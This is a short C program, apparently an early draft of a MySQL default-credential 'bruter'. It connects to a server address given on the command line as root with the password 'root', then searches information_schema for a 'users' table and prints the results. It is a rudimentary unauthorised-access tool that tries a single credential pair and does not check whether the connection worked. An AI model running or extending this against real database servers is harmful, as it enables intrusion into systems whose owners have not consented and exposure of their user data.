#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <my_global.h>
#include <mysql.h>

MYSQL *con;
MYSQL *brutercon;

void finish_with_error(MYSQL *cons)
{
    fprintf(stderr, "%s\n", mysql_error(cons));
    mysql_close(cons);
    exit(1);        
}

static int bruter(char *address)
{
    brutercon = mysql_init(NULL);
    mysql_real_connect(brutercon, address, "root", "root", "mysql", 3306, NULL, 0);
    if(mysql_query(brutercon, "SELECT * FROM information_schema.tables WHERE `TABLE_NAME`='users';")) 
    {
        finish_with_error(brutercon);
    } 
    MYSQL_RES *result = mysql_store_result(brutercon);
    if(result == NULL) 
    {
        finish_with_error(brutercon);
    }

    int num_fields = mysql_num_fields(result);
    MYSQL_ROW row;
    while((row = mysql_fetch_row(result))) 
    { 
        printf("%s\n", row[0]);
    }
    return 0;
}

int main(int argc, char **argv)
{
    bruter(argv[1]);
}
